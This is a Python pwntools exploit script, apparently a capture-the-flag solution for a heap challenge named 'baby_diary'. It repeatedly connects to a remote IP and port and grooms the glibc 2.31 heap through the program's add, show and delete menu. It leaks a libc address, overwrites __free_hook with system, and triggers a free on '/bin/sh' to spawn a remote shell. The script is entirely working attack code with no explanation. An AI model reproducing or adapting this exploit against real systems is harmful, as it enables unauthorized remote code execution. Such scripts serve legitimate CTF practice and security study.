# -*- coding: utf-8 -*

from pwn import*
context(os='linux',arch='amd64')


for i in range(0,1000):
    try:
        print("attack "+str(i))
        # elf=ELF('baby_diary')
        libc=ELF('libc-2.31.so')
        p=remote('8.140.114.72',1399)
        def add(size,data='a'):
        	p.recvuntil('>> ')
        	p.sendline('1')
        	p.recvuntil('ize: ')
        	p.sendline(str(size))
        	p.recvuntil('content: ')
        	p.sendline(str(data))
        def show(id):
        	p.recvuntil('>> ')
        	p.sendline('2')
        	p.recvuntil('ndex: ')
        	p.sendline(str(id))
        def delete(id):
        	p.recvuntil('>> ')
        	p.sendline('3')
        	p.recvuntil('ndex: ')
        	p.sendline(str(id))

        for i in range(8):
        	add(0x20-1)

        for i in range(7):
        	add(0x80-1)
        add(0x30+0x10000-0x9000-0x9f0+0x120-1-0xc0+0x50+0x90+0x90)#15
        add(0x20-1)#16

        add(0x720-1) #17
        add(0x70-1) #18
        add(0x80-1) #19
        delete(17)

        add(0x1010-1) #17

        add(0x20-1) #20
        add(0x88-1) #21
        add(0x148-1) #22
        add(0x4f0-1) #23
        add(0x500-1) #24
        delete(20)
        add(0x20-1,'\x01\x01\x01\x01\x01\x00\x00\x00'+p64(0x201))

        for i in range(7):
        	delete(i)

        delete(16)
        delete(20)

        for i in range(7):
        	add(0x20)
        add(0x20-1,'\x60') #16

        for i in range(7):
        	delete(i+8)



        delete(19)
        delete(21)
        add(0x1020) #20


        for i in range(7):
        	add(0x80)
        add(0x80,p64(0)+'\x60') #21

        delete(22)
        add(0x148-1,'\x00'*0x140+p64(0)) #22

        delete(21)

        add(0x147-1,'\x00'*0x138+'\x01\x01\x00\x00\x00\x00\x00\x00') #22
        # gdb.attach(p)
        # raw_input()
        delete(23)

        add(0xa0-1) #24
        show(21)
        p.recvuntil("content: ")
        leak=u64(p.recv(6).ljust(8,'\x00'))
        print hex(leak)
        libcbase=leak-(0x7ffff7fb0be0-0x00007ffff7dc5000)
        system=libcbase+libc.sym['system']
        free=libcbase+libc.sym['__free_hook']
        delete(16)

        add(0x20-1,p64(0)+p64(0x31))
        delete(22)
        delete(16)
        add(0x20-1,p64(free)*3)
        add(0x20-1,'/bin/sh\x00')
        add(0x20-1,p64(system))
        delete(22)

        p.interactive()
    except Exception as e:
        print("failed")
